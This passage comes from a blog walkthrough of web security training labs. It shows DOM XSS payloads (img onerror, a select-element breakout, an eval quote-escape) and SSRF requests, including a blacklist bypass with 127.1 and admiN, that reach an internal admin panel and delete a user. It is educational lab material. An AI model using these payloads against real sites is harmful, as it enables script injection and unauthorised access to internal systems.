<p><img loading="lazy" src="lab47.png" alt="alt"  />
</p>
<p>We could also use something like <code>abc'&quot;&gt;&lt;&gt;&lt;img src=1 onerror=alert()&gt;</code>, which is essentailly the same thing but it is a payload that could work in many cases.</p>
<hr>
<h3 id="lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">Lab: DOM XSS in document.write sink using source location.search inside a select element<a hidden class="anchor" aria-hidden="true" href="#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">#</a></h3>
<p>Enable DOM Invader and navigate to the website. If we click to a product we can see that we are redirecting to something like <code>/product?productId=1</code>.</p>
<p>Maybe the parameter <code>productId</code> is vulnerable to DOM XSS. Paste the canary, <code>/product?productId=&lt;paste_canary&gt;</code>. Before even using DOM Invader we get an error page that this is not a valid productId. Let&rsquo;s move on to the next entry point.</p>
<p>In each product page there is a check availability option.</p>
<p><img loading="lazy" src="lab48.png" alt="alt"  />
</p>
<p>Choose a random location from the given ones and click &ldquo;Check stock&rdquo;. We can see that we get redirected again to <code>/product</code> page. There is propably another request happening here so let&rsquo;s use Burp Proxy to intercept it and find out.</p>
<p><img loading="lazy" src="lab49.png" alt="alt"  />
</p>
<p>We have a POST request to <code>/product/store</code> with parameters <code>productId</code> and <code>storeId</code>. Let&rsquo;s check the last one for DOM XSS.</p>
<p>We got a hit at DOM tab.</p>
<p><img loading="lazy" src="lab50.png" alt="alt"  />
</p>
<p>The injection is here:
<img loading="lazy" src="lab51.png" alt="alt"  />
</p>
<p>If we close the two tags, <code>option</code> and <code>select</code>, maybe we can inject an <code>alert()</code> payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;/<span style="color:#f92672">option</span>&gt;&lt;/<span style="color:#f92672">select</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">1</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert()</span>&gt;
</span></span></code></pre></div><p><img loading="lazy" src="lab52.png" alt="alt"  />
</p>
<p>Great we solved the lab!</p>
<hr>
<h3 id="lab-dom-xss-in-innerhtml-sink-using-source-locationsearch">Lab: DOM XSS in innerHTML sink using source location.search<a hidden class="anchor" aria-hidden="true" href="#lab-dom-xss-in-innerhtml-sink-using-source-locationsearch">#</a></h3>
<p>Navigate to the website and test the search functionality, by pasting the canary to the <code>search</code> parameter.</p>
<p>From DOM Invader we get that the injection is inside <code>innerHtml</code> attribute, which means that we tags like <code>&lt;script&gt;</code> and <code>&lt;svg&gt;</code> won&rsquo;t get executed.</p>
<p><img loading="lazy" src="lab53.png" alt="alt"  />
</p>
<p><img loading="lazy" src="lab54.png" alt="alt"  />
</p>
<p>In this case we can use <code>&lt;img&gt;</code> tag, so the payload will be something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">1</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert()</span>&gt;
</span></span></code></pre></div><p>Great we got the alert!</p>
<hr>
<h3 id="lab-reflected-dom-xss">Lab: Reflected DOM XSS<a hidden class="anchor" aria-hidden="true" href="#lab-reflected-dom-xss">#</a></h3>
<p>Navigate and to the website and enter a random string to the search bar.</p>
<p>Intercept the requests with Burp Proxy. The first request returns the html page as a response.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /?search=test <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>
</span></span></code></pre></div><p>While the second one returns a JSON object.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> search-results/?search=test <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>
</span></span></code></pre></div><p>By using the DOM Invador plugin we also found that the injection point is inside an <code>eval()</code>, a JS function which parses a string as JS code.</p>
<p><img loading="lazy" src="lab56.png" alt="alt"  />

Essentially <code>this.responseText</code> is the JSON attribute <code>searchTerm</code> that is been taking the value of the URL <code>search</code> parameter.</p>
<p><img loading="lazy" src="lab55.png" alt="alt"  />
</p>
<p>The key here is that by not using JSON library we don&rsquo;t parse <code>this.responseText</code> as JSON object, but as a string!!!</p>
<p>That means that passing something like <code>&quot;-alert()</code> should do the job.</p>
<p><img loading="lazy" src="lab57.png" alt="alt"  />
</p>
<p>Ok server escapes double quote (&quot;). Let&rsquo;s escape the escape character (/) and close the brackets so it is a valid object, then comment out the rest.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>\&#34;-alert()}//
</span></span></code></pre></div><p><img loading="lazy" src="lab58.png" alt="alt"  />
</p>
<p>Great! Again this works because <code>eval()</code> parses the response as string and not as JSON, it is critical to know that JSON attributes cannot take expressions as values, like the payload we provided here in this case.</p>
<hr>
<!-- ### Lab: Stored DOM XSS -->
<h2 id="server-side-request-forfery-ssrf-vulnerabilities">Server-Side Request Forfery (SSRF) Vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#server-side-request-forfery-ssrf-vulnerabilities">#</a></h2>
<h3 id="lab-basic-ssrf-against-the-local-server">Lab: Basic SSRF against the local server<a hidden class="anchor" aria-hidden="true" href="#lab-basic-ssrf-against-the-local-server">#</a></h3>
<p>Navigate to a product page, like <code>/product?productId=1</code>. Then go to Check Stock and itercept the request with Burp.</p>
<p><img loading="lazy" src="lab59.png" alt="alt"  />
</p>
<p>The server is using the front-end HTTP request parameter <code>stcokApi</code> to do an internal request to an API.</p>
<p>Let&rsquo;s try to change the <code>stcokApi</code> parameter to something like <code>http://localhost/admin</code>. The server most of the times has different restrictions if the request comes from localhost and since this parameter is probably used to the server code to make an http request to the api, the localhost will be resolved and hence will return the admin panel to us.</p>
<p><img loading="lazy" src="lab60.png" alt="alt"  />
</p>
<p>Indeed we got the admin page and we can see and delete any user&rsquo;s account. But we cannot delete through the browser as we have no access. We need to specify the correct path and modify the <code>stockApi</code> accordingly.</p>
<p>After clicking to <code>carlos - Delete</code> we can see that the path we are hitting is <code>delete?username=carlos</code>.</p>
<p>So the request to exploit this SSRF vulnerability should be:</p>
<p><img loading="lazy" src="lab61.png" alt="alt"  />
</p>
<hr>
<h3 id="lab-basic-ssrf-against-another-back-end-system">Lab: Basic SSRF against another back-end system<a hidden class="anchor" aria-hidden="true" href="#lab-basic-ssrf-against-another-back-end-system">#</a></h3>
<p>Navigate to a product&rsquo;s page, like <code>/product?productId=1</code>. We know that there is an admin interface in <code>192.168.0.x:8080</code>.</p>
<p>So let&rsquo;s intercept the request when pressing <code>Check Stock</code>.</p>
<p><img loading="lazy" src="lab62.png" alt="alt"  />
</p>
<p>Send that to Intruder. Select Sniper as Attack type and mark the last digit of the IP address as the target.</p>
<p><img loading="lazy" src="lab63.png" alt="alt"  />
</p>
<p>At &ldquo;Payloads&rdquo; tab, select as &ldquo;Payload type&rdquo; Numbers and type from 0 to 255. Start the attack.</p>
<p><img loading="lazy" src="lab64.png" alt="alt"  />
</p>
<p>Ok the payload for <code>192.168.0.188:8080</code> has bigger length from the others, meaning that it could load the actual admin panel.</p>
<p>Great we can see the admin panel and some users. Let&rsquo;s use the endpoint to delete user <code>carlos</code> and solve the lab.</p>
<p><img loading="lazy" src="lab65.png" alt="alt"  />
</p>
<p><img loading="lazy" src="lab66.png" alt="alt"  />
</p>
<hr>
<h3 id="lab-ssrf-with-blacklist-based-input-filter">Lab: SSRF with blacklist-based input filter<a hidden class="anchor" aria-hidden="true" href="#lab-ssrf-with-blacklist-based-input-filter">#</a></h3>
<p>Navigate to a product&rsquo;s page, like <code>/product?productId=1</code>. We know that there is an admin interface at <code>http://localhost/admin</code>, but there is blacklist-based input filtering.</p>
<p>Intercept the request when pressing the &ldquo;Check Stock&rdquo; button. Let&rsquo;s try different payloads for <code>stockApi</code> parameter.</p>
<p>For <code>stockApi=http://127.0.0.1/admin</code> we get a <code>400 Bad request</code> with a message indicating that the request was blocked for security reasons.</p>
<p><img loading="lazy" src="lab68.png" alt="alt"  />
</p>
<p>If we try a random IP address with no <code>/admin</code>, <code>http://192.198.4.3</code> we get <code>200 OK</code> with a message <code>Could not connect to external stock check service</code>. This means that it is accepted, so the strings <code>localhost</code> and <code>127.0.0.1</code> are in the blacklist.</p>
<p>But what if we use different representation of them, like <code>127.1</code> for <code>127.0.0.1</code>.</p>
<p>SImilarly the <code>admin</code> string is blocked so let&rsquo;s type it like <code>admiN</code> or <code>ADMIN</code>.</p>
<p><img loading="lazy" src="lab67.png" alt="alt"  />
</p>
<p>The final payload is <code>http://127.1/admiN/delete?username=carlos</code>, which will delete the user <code>carlos</code>.</p>
<hr>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2025 <a href="https://dimparar.github.io/thecybersecurityblog/">The Cyber Security Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
